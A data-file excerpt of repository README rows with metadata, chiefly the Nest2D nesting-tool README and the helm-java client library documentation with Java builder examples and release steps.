推送失败会抛出异常，可对下面的类异常捕获后进行业务处理
```java
cn.jiguang.sdk.exception.ApiErrorException
```",20,1,1,apache-2.0,0.0
VovaStelmashchuk/nest2D,main,"# NestApp

The online platform for Nest algorithm.

![screen of working](./samples/web_screen.png)

## How to use?

#### [Visit Nest2D](https://nest2d.online/)

# What is Nest Problem?

Given a square piece of material and some letters to be laser-cut:

We want to pack all the letters into the square, using as little material as possible. If a single square is not enough,
we also want to minimize the number of squares used.

In the CNC world this is called ""nesting"", and software that does this is typically targeted at industrial customers and
very expensive.

for more detail , please go to [SVGNest](https://github.com/Jack000/SVGnest)

## The repository based on few github project, I keep the original history of commits.

Also, i have some plane to modify the project. The project will be support DXF file. The SVG format available only for
the preview. The project will be migrate to Kotlin fully or majority.

Fill free to create issues or pull requests. The main goal of the project is mainly free and open source solution for
nesting problem. I try to find the way to compensate the price of cloud server. **You Star of the project can help to
apply to some open source program.**

### Big Thanks to [JeroenGar](https://github.com/JeroenGar)

He is the author of [jagua-rs](https://github.com/JeroenGar/jagua-rs). I use his project as the core service for the
service. Without his project, I can't make this project.

I use slightly modified version of his project. Can be found [here](https://github.com/VovaStelmashchuk/jagua-rs)

### Credits:

- [SVGNest](https://github.com/Jack000/SVGnest)
- [DXFReader](https://github.com/wholder/DXFReader)
- [NEST4J fork](https://github.com/micycle1/Nest4J/tree/master)

### Referenced Paper

- [López-Camacho *et al.* 2013](http://www.cs.stir.ac.uk/~goc/papers/EffectiveHueristic2DAOR2013.pdf)
- [Kendall 2000](http://www.graham-kendall.com/papers/k2001.pdf)
- [E.K. Burke *et al.* 2006](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.440.379&rep=rep1&type=pdf)

### Hollow Polygon

For those hollow polygons, Nest4J provides a simple way to express by 2d coordinate system. If one polygon is inside in
another by their coordinates, the Nest4J will detect it automatically.

### DXF tags support

| Tag          | Support status |
|--------------|----------------|
| `Line`       | Supported      |
| `Circle`     | In plan        |
| `LwPolyline` | In plan        |
| `Polyline`   | In plan        |
| `Arc`        | In plan        |
| `Spline`     | In plan        |
| `Other`      | Not supported  |

### Backend doc

Backend read me is [here](./backend/ReadMe.md)",2,1,2,mit,3.0
manusa/helm-java,main,"# Helm Client for Java

Run Helm commands directly from Java with this client library without the need for a Helm CLI.

It allows you to execute Helm commands directly from Java without requiring a separate Helm installation.
Despite this, it still leverages the native Helm libraries, which are written in Go, to function.
As a result, you can expect the same behavior as you would get from using Helm directly.

## Getting started

Add the dependency to your project:

```xml
<dependency>
  <groupId>com.marcnuri.helm-java</groupId>
  <artifactId>helm-java</artifactId>
  <version>0.0.12</version>
</dependency>
```

Start using it:

```java
public static void main(String... args) {
  new Helm(Paths.get(""path"", ""to"", ""chart"")).install().call();
}
```

Check the features section for more examples and documentation.

## Features

### Create

Equivalent of [`helm create`](https://helm.sh/docs/helm/helm_create/).

Creates a chart directory along with the common files and directories used in a chart.

``` java
Helm.create()
  // Name of the chart to create
  .withName(""test"")
  // Path to the directory where the new chart directory will be created
  .withDir(Paths.get(""/tmp""))
  .call();
```

### Dependency

Equivalent of [`helm dependency`](https://helm.sh/docs/helm/helm_dependency/).

Manage a chart's dependencies.

#### Dependency build

Equivalent of [`helm dependency build`](https://helm.sh/docs/helm/helm_dependency_build/).

Rebuild the chart's on-disk dependencies (`charts/`) based on the Chart.lock file.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().build()
  // Optionally specify a keyring containing public keys (used for verification)
  .keyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally skip refreshing the local repository cache
  .skipRefresh()
  // Optionally verify the packages against signatures
  .verify()
  // Optionally enable verbose output
  .debug()
  .call();
```

#### Dependency list

Equivalent of [`helm dependency list`](https://helm.sh/docs/helm/helm_dependency_list/).

List the dependencies for the given chart.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().list()
  .getDependencies();
```

#### Dependency update

Equivalent of [`helm dependency update`](https://helm.sh/docs/helm/helm_dependency_update/).

Update chart's on-disk dependencies (`charts/`) to mirror the contents of Chart.yaml.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().update()
  // Optionally specify a keyring containing public keys (used for verification)
  .keyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally skip refreshing the local repository cache
  .skipRefresh()
  // Optionally verify the packages against signatures
  .verify()
  // Optionally enable verbose output
  .debug()
  .call();
```

### Install

Equivalent of [`helm install`](https://helm.sh/docs/helm/helm_install/).

Installs a chart archive.

``` java
// Instantiate the command with chart reference
InstallCommand installCommand = Helm.install(""chart/reference"");
// Instatiate the command with chart archive
InstallCommand installCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).install();
Release result = installCommand
  // Name of the release to install
  .withName(""release-name"")
  // Optionally generate a release name (and omit the name parameter)
  .generateName()
  // Optionally specify a template for the name generation
  .withNameTemplate(""a-chart-{{randAlpha 6 | lower}}"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace to install the release into
  .withNamespace(""namespace"")
  // Optionally create the namespace if not present
  .createNamespace()
  // Optionally, if set, the installation process deletes the installation on failure
  .atomic()
  // Optionally specify a custom description for the release
  .withDescription(""the-description"")
  // Optionally enable the use of development versions too
  .devel()
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally disable the validation of rendered templates against the Kubernetes OpenAPI Schema
  .disableOpenApiValidation()
  // Optionally enable dry run mode to simulate an install
  .dryRun()
  // Optionally specify the dry run strategy (client, server, or none). If unset, defaults to client
  .withDryRunOption(DryRun.CLIENT)
  // Optionally wait until all Pods are in a ready state, PVCs are bound, Deployments have
  // minimum (Desired minus maxUnavailable) Pods in ready state and Services have an IP
  // address (and Ingress if a LoadBalancer) before marking the release as successful. 
  .waitReady()
  // Optionally set typed values for the chart (can be repeated)
  .set(""key"", ""value"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable verbose output
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Lint

Equivalent of [`helm lint`](https://helm.sh/docs/helm/helm_lint/).

Examine a chart for possible issues.

``` java
LintResult result = new Helm(Paths.get(""path"", ""to"", ""chart"")).lint()
  // Optionally enable strict mode (fail on lint warnings)
  .strict()
  // Optionally enable quiet mode (only show warnings and errors) 
  .quiet()
  .call();
result.isFailed(); // true if linting failed
result.getMessages(); // list of linting messages
```

### List

Equivalent of [`helm list`](https://helm.sh/docs/helm/helm_list/).

Lists all the releases for a specified namespace (uses current namespace context if namespace not specified).

``` java
List<Release> releases = Helm.list()
  // Optionally specify the Kubernetes namespace to list the releases from
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally show all releases without any filter applied
  .all()
  // Optionally show releases across all namespaces
  .allNamespaces()
  // Optionally show deployed releases
  // If no other option is specified, this will be automatically enabled
  .deployed()
  // Optionally show failed releases
  .failed()
  // Optionally show pending releases
  .pending()
  // Optionally show superseded releases
  .superseded()
  // Optionally show uninstalled releases (if 'helm uninstall --keep-history' was used)
  .uninstalled()
  // Optionally show releases that are currently being uninstalled
  .uninstalling()
  .call();
```

### Package

Equivalent of [`helm package`](https://helm.sh/docs/helm/helm_package/).

Package a chart directory into a chart archive.

``` java
Path result = new Helm(Paths.get(""path"", ""to"", ""chart"")).package()
  // Optionally specify a target directory
  .destination(Paths.get(""path"", ""to"", ""destination""))
  // Optionally enable signing
  .sign()
  // Optionally specify a key UID (required if signing)
  .withKey(""KEY_UID"")
  // Optionally specify a keyring (required if signing)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally specify a file containing the passphrase for the signing key
  .withPassphraseFile(Paths.get(""path"", ""to"", ""passphrase""))
  .call();
```

### Push

Equivalent of [`helm push`](https://helm.sh/docs/helm/helm_push/).

Upload a chart to a registry.

``` java
Helm.push()
  // Location of the packaged chart (.tgz) to push
  .withChart(Paths.get(""path"", ""to"", ""chart"", ""package""))
  // URI of the remote registry to push the chart to
  .withRemote(""oci://remote-server.example.com:12345"");
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Registry

Equivalent of [`helm registry`](https://helm.sh/docs/helm/helm_registry/).

Log in to or log out from a registry.

#### Registry login

Equivalent of [`helm registry login`](https://helm.sh/docs/helm/helm_registry_login/).

Log in to a registry.

``` java
Helm.registry().login()
  // The host to log in to.
  .withHost(""host"")
  // Registry username
  .withUsername(""username"");
  // Registry password or identity token.
  .withPassword(""password"");
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Registry logout

Equivalent of [`helm registry logout`](https://helm.sh/docs/helm/helm_registry_logout/).

Log out from a registry.

``` java
Helm.registry().logout()
  // The host to log out from.
  .withHost(""host"")
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Repo

Equivalent of [`helm repo`](https://helm.sh/docs/helm/helm_repo/).

Add, list, remove, update, and index chart repositories.

#### Repo add

Equivalent of [`helm repo add`](https://helm.sh/docs/helm/helm_repo_add/).

Add a chart repository.

``` java
Helm.repo().add()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Name of the repository to add
  .withName(""repo-1"")
  // URL of the repository to add
  .withUrl(URI.create(""https://charts.helm.sh/stable""))
  // Optionally specify a username for HTTP basic authentication
  .withUsername(""user"")
  // Optionally specify a password for HTTP basic authentication
  .withPassword(""pass"")
  // Optionally specify an SSL certificate file to identify the HTTPS client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the HTTPS client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  .call()
```

#### Repo list

Equivalent of [`helm repo list`](https://helm.sh/docs/helm/helm_repo_list/).

List chart repositories.

``` java
List<Repository> respositories = Helm.repo().list()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

#### Repo remove

Equivalent of [`helm repo remove`](https://helm.sh/docs/helm/helm_repo_remove/).

Remove one or more chart repositories.

``` java
Helm.repo().remove()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Add a repository name to the list of repos to remove
  .withRepo(""repo-1"")
  // Add another repository name to the list of repos to remove
  .withRepo(""repo-2"")
  .call();
```

#### Repo update

Equivalent of [`helm repo update`](https://helm.sh/docs/helm/helm_repo_update/).

Update information of available charts locally from chart repositories.

``` java
Helm.repo().update()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Add a repository name to the list of repos to remove
  .withRepo(""repo-1"")
  // Add another repository name to the list of repos to remove
  .withRepo(""repo-2"")
  .call();
```

### Search

Equivalent of [`helm search`](https://helm.sh/docs/helm/helm_search/).

This command provides the ability to search for Helm charts in various places including the Artifact Hub and the repositories you have added.

#### Repo

Equivalent of [`helm search repo`](https://helm.sh/docs/helm/helm_search_repo/).

Search repositories for a keyword in charts.

``` java
List<SearchResult> results = Helm.search().repo()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Optionally set the keyword to match against the repo name, chart name, chart keywords, and description.
  .withKeyword(""keyword"")
  // Optionally use regular expressions for searching.
  .regexp()
  // Optionally search for development versions too (alpha, beta, and release candidate releases).
  .devel()
  // Optionally search using semantic versioning constraints
  .withVersion("">=1.0.0"")
  .call();
```

### Show

Equivalent of [`helm show`](https://helm.sh/docs/helm/helm_show/).

Show information about a chart.

#### Show all

Equivalent of [`helm show all`](https://helm.sh/docs/helm/helm_show_all/).

Show **all** information about a chart.

``` java
// Instantiate the command with chart reference
ShowCommand showCommand = Helm.show(""chart/reference"");
// Instatiate the command with chart archive
ShowCommand showCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).show();
String result = showCommand.all()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show chart

Equivalent of [`helm show chart`](https://helm.sh/docs/helm/helm_show_chart/).

Show the chart's definition.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .chart()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show CRDs

Equivalent of [`helm show crds`](https://helm.sh/docs/helm/helm_show_crds/).

Show the chart's CRDs.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .crds()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show README

Equivalent of [`helm show readme`](https://helm.sh/docs/helm/helm_show_readme/).

Show the chart's README.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .readme()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show values

Equivalent of [`helm show values`](https://helm.sh/docs/helm/helm_show_values/).

Show the chart's values.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .values()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Template

Equivalent of [`helm template`](https://helm.sh/docs/helm/helm_template/).

This command renders chart templates locally and displays the output.

``` java
// Instantiate the command with chart reference
TemplateCommand templateCommand = Helm.template(""chart/reference"");
// Instatiate the command with chart archive
TemplateCommand templateCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).template();
String result = templateCommand
  // Optionally specify a name for the release
  .withName(""release-name"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace for the release
  .withNamespace(""namespace"")
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally set values for the chart
  .set(""key"", ""value"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable debug mode to print out verbose information
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Test

Equivalent of [`helm test`](https://helm.sh/docs/helm/helm_test/).

This command runs the tests for a release.

``` java
Release result = Helm.test(""chart/reference"")
  // Optionally specify the time (in seconds) to wait for any individual Kubernetes operation (like Jobs for hooks) (default 300)
  .withTimeout(int timeout)
  // Optionally specify the Kubernetes namespace
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally enable verbose output
  .debug()
  .call();
```

### Uninstall

Equivalent of [`helm uninstall`](https://helm.sh/docs/helm/helm_uninstall/).

This command takes a release name and uninstalls the release.

``` java
String result = Helm.uninstall(""chart/reference"")
  // Optionally enable dry run mode to simulate an uninstall
  .dryRun()
  // Optionally prevent hooks from running during uninstallation
  .noHooks()
  // Optionally treat ""release not found"" as a successful uninstall
  .ignoreNotFound()
  // Optionally remove all associated resources and mark the release as deleted, but retain the release history
  .keepHistory()
  // Optionally select the deletion cascading strategy for the dependents. If unset, defaults to background
  .withCascade(Cascade.BACKGROUND)
  // Optionally specify the Kubernetes namespace to uninstall the release from
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally enable verbose output
  .debug()
  .call();
```

### Upgrade

Equivalent of [`helm upgrade`](https://helm.sh/docs/helm/helm_upgrade/).

Upgrades a release to a new version of a chart.

``` java
// Instantiate the command with chart reference
UpgradeCommand upgradeCommand = Helm.upgrade(""chart/reference"");
// Instatiate the command with chart archive
UpgradeCommand upgradeCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).upgrade();
Release result = upgradeCommand
  // Name of the release to upgrade
  .withName(""release-name"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace to upgrade the release
  .withNamespace(""namespace"")
  // Optionally run an installation if a release by this name doesn't already exist
  .install()
  // Optionally force resource updates through a replacement strategy
  .force()
  // Optionally reset the values to the ones built into the chart when upgrading
  .resetValues()
  // Optionally reuse the last release's values and merge in any overrides from the current values when upgrading
  // Ignored if used in combination with resetValues()
  .reuseValues()
  // Optionally reset the values to the ones built into the chart,
  // apply the last release's values and merge in any overrides from the current values when upgrading
  // Ignored if used in combination with resetValues() or reuseValues()
  .resetThenReuseValues()
  // Optionally, if set, upgrade process rolls back changes made in case of failed upgrade
  .atomic()
  // Optionally allow deletion of new resources created in this upgrade when upgrade fails
  .cleanupOnFail()
  // Optionally create the release namespace if not present (if install() is set)
  .createNamespace()
  // Optionally specify a custom description
  .withDescription(""the-description"")
  // Optionally enable the use of development versions too
  .devel()
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally disable the validation of rendered templates against the Kubernetes OpenAPI Schema
  .disableOpenApiValidation()
  // Optionally enable dry run mode to simulate an install
  .dryRun()
  // Optionally specify the dry run strategy (client, server, or none). If unset, defaults to client
  .withDryRunOption(DryRun.CLIENT)
  // Optionally wait until all Pods are in a ready state, PVCs are bound, Deployments have
  // minimum (Desired minus maxUnavailable) Pods in ready state and Services have an IP
  // address (and Ingress if a LoadBalancer) before marking the release as successful. 
  .waitReady()
  // Optionally set typed values for the chart (can be repeated)
  .set(""key"", ""value"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable verbose output
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Version

Similar to [`helm version`](https://helm.sh/docs/helm/helm_version/).

Returns the version of the underlying Helm library.

``` java
String version = Helm.version();
```

## Development

### Project Structure

- Go:
  - `native`: contains the Go project that creates the native c bindings
- Java:
  - `helm-java`: contains the actual Helm Java client library
  - `lib`: contains the Java modules related to the native c binding libraries
    - `api`: contains the API for the native interfaces
    - `darwin-amd64`: contains the Java native access library for darwin/amd64
    - `darwin-arm64`: contains the Java native access library for darwin/arm64
    - `linux-amd64`: contains the Java native access library for linux/amd64
    - `linux-arm64`: contains the Java native access library for linux/arm64
    - `windows-amd64`: contains the Java native access library for windows/amd64

### Release Process

#### Release to Maven Central

To release a new version automatically:

```shell
make release V=X.Y.Z VS=X.Y
```
- `V`: New version to release.
- `VS`: New SNAPSHOT version for Maven.

To release a new version manually:

1. Update the version in the `pom.xml` file.
   ```shell
   mvn versions:set -DnewVersion=X.Y.Z -DgenerateBackupPoms=false
   ```
2. Commit and tag the release with the  `pom.xml` version.
   ```shell
   git add .
   git commit -m ""[RELEASE] vX.Y.Z released""
   git tag vX.Y.Z
   git push origin vX.Y.Z
   ```
3. Update the version in the `pom.xml` file to the next snapshot version.
   ```shell
   mvn versions:set -DnewVersion=X.Y-SNAPSHOT -DgenerateBackupPoms=false
   ```
4. Commit the changes with the following message:
   ```shell
   git add .
   git commit -m ""[RELEASE] v0.0.11 released, prepare for next development iteration""
   git push origin master
   ```

#### Create GitHub Release

Once the release is published to Maven Central, create a new [GitHub release](https://github.com/manusa/helm-java/releases/new) for the released tag.

### License Headers

Whenever a new file is created, the license header must be added. To add the license header to all files:

```shell
make license
```
",12,10,1,apache-2.0,67.0
